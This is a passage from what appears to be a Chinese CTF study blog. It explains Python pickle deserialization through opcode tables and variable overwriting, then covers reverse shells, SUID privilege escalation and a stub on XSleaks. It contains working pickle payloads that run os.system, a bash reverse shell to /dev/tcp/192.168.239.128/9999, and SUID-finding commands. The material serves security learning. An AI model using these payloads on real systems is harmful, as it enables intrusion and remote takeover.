file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure>

<p>kali自带gzip压缩后更改为白名单后缀上传</p>
<p>访问<code>phar://upload/3.png</code></p>
<h3 id="5-GC回收机制"><a href="#5-GC回收机制" class="headerlink" title="(5)GC回收机制"></a>(5)GC回收机制</h3><p>1</p>
<h3 id="6-Pickle反序列化"><a href="#6-Pickle反序列化" class="headerlink" title="(6)Pickle反序列化"></a>(6)Pickle反序列化</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13498">pickle反序列化漏洞基础知识与绕过简析-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_86640358/article/details/141905074">CTF题型 Python中pickle反序列化进阶利用&amp;amp；例题&amp;amp；opache绕过_python pickle ctf-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7032">pickle反序列化初探-先知社区</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sijidou/p/16305695.html">CTF-python pickle反序列化 - sijidou - 博客园</a></p>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>pickle是Python的一个库,可以对一个对象进行序列化和反序列化操作.其中<code>__reduce__</code>魔法函数会在一个对象被反序列化时自动执行,我们可以通过在<code>__reduce__</code>魔法函数内植入恶意代码的方式进行任意命令执行.通常会利用到Python的反弹shell.</p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="python对象"><a href="#python对象" class="headerlink" title="python对象"></a>python对象</h5><p>在python中,对象的概念十分广泛.</p>
<blockquote>
<p>对象是数据和功能的结合体。Python是一种面向对象编程语言，它使用对象来组织代码和数据。在Python中，几乎所有的东西都是对象，包括整数、浮点数、列表、元组、字典、函数、类等。</p>
</blockquote>
<p>一个Python对象通常包含以下部分：</p>
<ol>
<li><strong>身份（Identity）</strong>：每个对象都有一个唯一的身份标识，通常是它的内存地址。可以使用内建函数<code>id()</code>来获取对象的身份</li>
<li><strong>类型（Type）</strong>：对象属于某种类型，比如整数、浮点数、字符串、列表等。可以使用内建函数<code>type()</code>来获取对象的类型</li>
<li><strong>值（Value）</strong>：对象所持有的数据。不同类型的对象有不同的值。例如，整数对象的值是整数值，字符串对象的值是字符序列</li>
<li><strong>属性（Attributes）</strong>：对象可以有零个或多个属性，这些属性是附加到对象上的数据。属性通常用于存储对象的状态信息</li>
<li><strong>方法（Methods）</strong>：对象可以有零个或多个方法，方法是附加到对象上的函数。这些方法定义了对象可以执行的操作</li>
</ol>
<h5 id="Python面向对象"><a href="#Python面向对象" class="headerlink" title="Python面向对象"></a>Python面向对象</h5><p>python是一门面向对象的语言.也正因为python面向对象的特性,使得我们有更加丰富的选择进行绕过</p>
<p>在Python中,面向对象的思想和php是一致的,只是定义类的代码,调用类函数和类属性的方式和php不同</p>
<p>python中用<code>.</code>调用实例的属性和方法</p>
<p>python中存在类属性和实例属性,实例属性只对一个实例生效,类属性对一个类生效.定义实例属性的方法是用<code>__init__</code>魔术方法.调用类属性的方法是<code>类名.变量名</code>或者<code>self.__class__.变量名</code></p>
<p>同样地,python的面向对象也有私有属性,私有方法,类的继承等</p>
<h5 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h5><p>序列化就是将一个对象转换为以字符串方式存储的过程,反序列化就是将字符串重新变为一个对象的实例</p>
<blockquote>
<p>注意,在linux下和windows下进行序列化的操作的结果可能会有所不同,在做题时需要根据靶机的系统选择用windows还是linux进行序列化操作.</p>
</blockquote>
<h5 id="关于序列化和反序列化的函数"><a href="#关于序列化和反序列化的函数" class="headerlink" title="关于序列化和反序列化的函数"></a>关于序列化和反序列化的函数</h5><ol>
<li><code>pickle.dump()</code></li>
<li><code>pickle.load()</code></li>
<li><code>pickle.dumps()</code></li>
<li><code>pickle.loads()</code></li>
</ol>
<p>其中两个dump函数是把python对象转换为二进制对象的,两个load函数是把二进制对象转换为python对象的</p>
<p>而s函数是指对字符串进行反序列化和序列化操作,另外两个函数是对文件进行操作</p>
<h5 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h5><p>和php类似,python魔术方法也会在一些特定情况下被自动调用.我们尤其要注意的是<code>__reduce__</code>魔术方法,这会在反序列化过程开始时被调用,所以我们可以序列化一个<code>__reduce__</code>魔术方法中有系统命令的实例并且让服务器将它反序列化,从而达到任意命令执行的效果</p>
<p>除此之外还有很多魔术方法.例如初始化函数<code>__init__</code>和构造函数<code>__new__</code>.和php类似,python中也有魔法属性.例如<code>__doc__</code>,<code>__name__</code>,<code>__class__</code>,<code>__base__</code>等</p>
<p><code>pickle.loads()</code>会在反序列化一个实例时自动引入没有引入的库</p>
<p>构造方法<code>__new__</code></p>
<ul>
<li>在实例化一个类时自动被调用,是类的构造方法</li>
<li>可以通过重写<code>__new__</code>自定义类的实例化过程</li>
</ul>
<p>初始化方法<code>__init__</code></p>
<ul>
<li>在<code>__new__</code>方法之后被调用,主要负责定义类的属性,以初始化实例</li>
</ul>
<p>析构方法<code>__del__</code></p>
<ul>
<li>在实例将被销毁时调用</li>
<li>只在实例的所有调用结束后才会被调用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__getattr__</span><br></pre></td></tr></table></figure>

<ul>
<li>获取不存在的对象属性时被触发</li>
<li>存在返回值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__setattr__</span><br></pre></td></tr></table></figure>

<ul>
<li>设置对象成员值的时候触发</li>
<li>传入一个self,一个要设置的属性名称,一个属性的值</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__repr__</span><br></pre></td></tr></table></figure>

<ul>
<li>在实例被传入<code>repr()</code>时被调用</li>
<li>必须返回字符串</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call__</span><br></pre></td></tr></table></figure>

<ul>
<li>把对象当作函数调用时触发</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__len__</span><br></pre></td></tr></table></figure>

<ul>
<li>被传入<code>len()</code>时调用</li>
<li>返回一个整型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__str__</span><br></pre></td></tr></table></figure>

<ul>
<li>被<code>str()</code>,<code>format()</code>,<code>print()</code>调用时调用,返回一个字符串</li>
</ul>
<h5 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h5><p>栈是一种存储数据的结构.栈有压栈和弹栈两种操作</p>
<p>可以把栈看做一个弹夹,先进栈的数据后出栈,压栈就像压子弹,弹栈就像弹子弹</p>
<h5 id="什么是PVM"><a href="#什么是PVM" class="headerlink" title="什么是PVM"></a>什么是PVM</h5><p>pickle是一种栈语言,它由一串串opcode（指令集）组成.该语言的解析是依靠Pickle Virtual Machine （PVM）进行的</p>
<p>为什么要学习pickle?</p>
<blockquote>
<p>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</p>
</blockquote>
<p>PVM由以下三部分组成</p>
<ul>
<li>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回</li>
<li>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象</li>
<li>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储</li>
</ul>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><table>
<thead>
<tr>
<th>操作码</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
<th>memo 上的变化</th>
</tr>
</thead>
<tbody><tr>
<td><code>c</code></td>
<td>获取一个全局对象或导入一个模块</td>
<td><code>c[module]n[instance]n</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>o</code></td>
<td>寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象）</td>
<td><code>o</code></td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>i</code></td>
<td>相当于 <code>c</code> 和 <code>o</code> 的组合，先获取一个全局函数，然后寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td><code>i[module]n[callable]n</code></td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>N</code></td>
<td>实例化一个 None</td>
<td><code>N</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>S</code></td>
<td>实例化一个字符串对象</td>
<td><code>S&#39;xxx&#39;n</code>（也可以使用双引号、<code>’</code> 等 Python 字符串形式）</td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>V</code></td>
<td>实例化一个 UNICODE 字符串对象</td>
<td><code>Vxxxn</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>I</code></td>
<td>实例化一个 int 对象</td>
<td><code>Ixxxn</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>F</code></td>
<td>实例化一个 float 对象</td>
<td><code>Fx.xn</code></td>
<td>获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>R</code></td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td><code>R</code></td>
<td>函数和参数出栈，函数的返回值入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>.</code></td>
<td>程序结束，栈顶的一个元素作为 <code>pickle.loads()</code> 的返回值</td>
<td><code>.</code></td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td><code>(</code></td>
<td>向栈中压入一个 MARK 标记</td>
<td><code>(</code></td>
<td>MARK 标记入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>t</code></td>
<td>寻找栈中的上一个 MARK，并组合之间的数据为元组</td>
<td><code>t</code></td>
<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>)</code></td>
<td>向栈中直接压入一个空元组</td>
<td><code>)</code></td>
<td>空元组入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>l</code></td>
<td>寻找栈中的上一个 MARK，并组合之间的数据为列表</td>
<td><code>l</code></td>
<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>\]</code></td>
<td>向栈中直接压入一个空列表</td>
<td><code>\]</code></td>
<td>空列表入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>d</code></td>
<td>寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对）</td>
<td><code>d</code></td>
<td>MARK 标记以及被组合的数据出栈，获得的对象入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>&#125;</code></td>
<td>向栈中直接压入一个空字典</td>
<td><code>&#125;</code></td>
<td>空字典入栈</td>
<td>无</td>
</tr>
<tr>
<td><code>p</code></td>
<td>将栈顶对象储存至 memo_n</td>
<td><code>pnn</code></td>
<td>无</td>
<td>对象被储存</td>
</tr>
<tr>
<td><code>g</code></td>
<td>将 memo_n 的对象压栈</td>
<td><code>gnn</code></td>
<td>对象被压栈</td>
<td>无</td>
</tr>
<tr>
<td><code>0</code></td>
<td>丢弃栈顶对象</td>
<td><code>0</code></td>
<td>栈顶对象被丢弃</td>
<td>无</td>
</tr>
<tr>
<td><code>b</code></td>
<td>使用栈中的第一个元素（储存多个属性名：属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td><code>b</code></td>
<td>栈上第一个元素出栈</td>
<td>无</td>
</tr>
</tbody></table>
<p><strong>例如：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /f* &gt; /tmp/a&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<ol>
<li><code>( </code>：向栈中压入一个 MARK 标记</li>
<li><code>cos</code>：导入 <code>os</code> 模块</li>
<li><code>system</code>：获取 <code>os.system</code> 函数并压栈</li>
<li><code>S&#39;cat /f* &gt; /tmp/a&#39;</code>：将字符串 <code>&#39;cat /f* &gt; /tmp/a&#39;</code> 压栈</li>
<li><code>o.</code>：寻找栈中的上一个 MARK，以之间的第一个数据（<code>os.system</code> 函数）为 callable，第二个数据（字符串）为参数，执行该函数。<code>.</code> 表示程序结束，栈顶的一个元素作为 <code>pickle.loads()</code> 的返回值</li>
</ol>
<p><strong>1：栈的初始状态</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK (由 &#x27;(&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>

<p><strong>2：导入 <code>os</code> 模块</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块 (由 &#x27;cos&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>

<p><strong>3：获取 <code>os.system</code> 函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块</span><br><span class="line">        └── os.system函数 (由 &#x27;system&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>

<p><strong>4：压入命令字符串</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块</span><br><span class="line">        └── os.system函数</span><br><span class="line">            └── &#x27;cat /f* &gt; /tmp/a&#x27;字符串 (由 &#x27;S&#x27; 操作码压入)</span><br></pre></td></tr></table></figure>

<p><strong>5：调用 <code>os.system</code> 函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── MARK</span><br><span class="line">    └── os模块</span><br><span class="line">        └── os.system函数</span><br><span class="line">            └── &#x27;cat /f* &gt; /tmp/a&#x27;字符串</span><br></pre></td></tr></table></figure>

<p>执行 <code>o</code> 操作码后，<code>os.system</code> 函数被调用，参数为 <code>&#39;cat /f* &gt; /tmp/a&#39;</code>。栈中的 <code>MARK</code>、<code>os模块</code>、<code>os.system函数</code> 和命令字符串都被弹出，函数的返回值（如果有的话）会被压入栈</p>
<p><strong>6：结束序列化</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">栈底</span><br><span class="line">└── 函数返回值 (假设为 None)</span><br></pre></td></tr></table></figure>

<p>执行 <code>.</code> 操作码后，序列化过程结束，栈顶的值（None）作为 <code>pickle.loads()</code> 的返回值</p>
<p>也可以使用以下代码片段来生成Pickle序列化：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Payload</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;cat /f* &gt; /tmp/a&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">payload = Payload()</span><br><span class="line">serialized_payload = pickle.dumps(payload)</span><br><span class="line"><span class="built_in">print</span>(serialized_payload)</span><br></pre></td></tr></table></figure>

<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/pi2.png"></p>
<p>也可以将Pickle的代码变得可读起来（并非好读）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">miHoYo</span></span><br><span class="line"><span class="string">(S&#x27;miHoYo&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Honkai StarRail&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickletools.dis(opcode)</span><br></pre></td></tr></table></figure>

<p><strong><code>db.</code></strong>:</p>
<ul>
<li><code>d</code> 操作码：从栈中弹出键值对（<code>&#39;secret&#39;</code> 和 <code>&#39;Hack!!!&#39;</code>），构建一个字典 <code>&#123;&#39;secret&#39;: &#39;Hack!!!&#39;&#125;</code>，并将其压入栈</li>
<li><code>b</code> 操作码：弹出栈顶的字典和前面的对象（假设是通过 <code>c__main__</code> 导入的 <code>secret</code> 对象），将字典中的属性绑定到对象上。即为 <code>secret</code> 对象添加一个属性 <code>&#39;secret&#39;</code>，其值为 <code>&#39;Hack!!!&#39;</code></li>
<li><code>.</code> 操作码：结束反序列化过程</li>
</ul>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="覆盖变量"><a href="#覆盖变量" class="headerlink" title="覆盖变量"></a>覆盖变量</h5><p><strong>比如：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">miHoYo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">m = miHoYo(<span class="string">&quot;Genshin Impact&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m.name)</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">m</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Honkai StarRail&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(m.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pickletools.dis(opcode)</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/pi3.png"></p>
<p>输出星穹铁道即代表成功覆盖了变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">opcode=b&quot;&quot;&quot;c__main__</span><br><span class="line">m#向栈中压入被实例化的m</span><br><span class="line">(S&#x27;name&#x27;#压入一个MARK,再压入一个&#x27;name&#x27;字符串</span><br><span class="line">S&#x27;Honkai StarRail&#x27;#压入一个ghd</span><br><span class="line">db.&quot;&quot;&quot;</span><br><span class="line">#d操作符弹出&#x27;name&#x27;和ghd,压入一个字典&#123;name:Honkai StarRail&#125;</span><br><span class="line">#b操作符弹出字典,并用字典中的键值对&#123;name:Honkai StarRail&#125;给s赋值(相当于执行了s的__init__),完成了篡改</span><br></pre></td></tr></table></figure>

<h5 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a>RCE</h5><p>相关的就是 <code>c</code>,<code>R</code>,<code>o</code>,<code>i</code>,<code>b</code>这几个操作符</p>
<p>与函数执行相关的opcode有三个： <code>R</code> 、 <code>i</code> 、 <code>o</code> ，所以我们可以从三个方向进行构造：</p>
<p><code>R</code> ：（<code>R</code> 操作符用于构建对象）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><code>tR</code>：其中 <code>t</code> 表示元组（tuple），<code>R</code> 表示调用 <code>os.system</code> 函数，并将字符串 <code>&#39;whoami&#39;</code> 作为参数传递给它</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system <span class="comment">#用c操作符引入os.system,也就是把os.system压入栈</span></span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span> <span class="comment">#先把MARK压入栈,再把ls压入栈</span></span><br><span class="line">tR. <span class="comment">#t操作符把ls出栈,元组(ls)入栈</span></span><br><span class="line">    <span class="comment">#R操作符把元组作为os.system的参数传入并执行</span></span><br><span class="line">&lt;=&gt; <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(*(<span class="string">&#x27;ls&#x27;</span>,))</span><br></pre></td></tr></table></figure>

<p><code>i</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><code>i</code>像是<code>o</code>和<code>c</code>的结合,先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
<p><code>o</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Student</span></span><br><span class="line"><span class="string">(S&#x27;XiaoMing&#x27;</span></span><br><span class="line"><span class="string">S&quot;20&quot;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a=pickle.loads(data)</span><br><span class="line"><span class="built_in">print</span>(a.name,a.age)</span><br><span class="line"></span><br><span class="line"><span class="comment">#miHoYo 114514</span></span><br></pre></td></tr></table></figure>

<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[watevrCTF-2019]Pickle">https://buuoj.cn/challenges#[watevrCTF-2019]Pickle</a> Store) Pickle store</p>
<hr>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><code>nc -lvp 9999</code></p>
<p>nc是netcat的简写，可实现任意TCP&#x2F;UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-v 详细输出--用两个-v可得到更详细的内容</span><br><span class="line">-p port 本地端口号</span><br></pre></td></tr></table></figure>

<p><code>bash -i &gt;&amp; /dev/tcp/192.168.239.128/9999 0&gt;&amp;1</code></p>
<p>bash -i代表在本地打开一个bash</p>
<blockquote>
<p>&amp;后面跟上&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps<br>&#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接<br>远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</p>
<p>————————————————</p>
</blockquote>
<ul>
<li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。 当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li>
<li>在&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port后面加上0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了<br>那么，0&gt;&amp;2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了&#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port这个文件，也就是远程，那么标准输入也就重定向到了远程</li>
</ul>
<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /-user root -perm-4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find /-perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find /-user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125;\;</span><br></pre></td></tr></table></figure>

<p>什么是SUID？</p>
<p>Linux下文件权限分为 r4 w2 x1分别对应可读，可写，可执行</p>
<ul>
<li>当 SUID 位被设置在一个可执行文件上时，该文件在执行期间，进程的有效用户 ID（EUID）会被设置为该文件所有者的用户 ID。例如，一个属于 root 用户的文件，如果设置了 SUID 位，当普通用户执行这个文件时，这个执行进程的 EUID 就是 root</li>
<li>有效用户 ID 决定了进程在执行过程中对系统资源访问的权限。这就意味着，如果一个程序需要更高权限（通常是 root 权限）才能完成某些特定的操作，通过设置 SUID 位，普通用户在运行这个程序时也能临时获得该程序所有者的权限来执行这些操作</li>
</ul>
<p>root权限一般是3位，就比如说是什么644（所属者-所属组-other）</p>
<p>而sudo的权限可以是4位比如7644</p>
<p>然后就是SUID文件只作用于二进制文件</p>
<h2 id="XSleaks"><a href="#XSleaks" class="headerlink" title="XSleaks"></a>XSleaks</h2><p>简介+原理（利用条件）+例题</p>
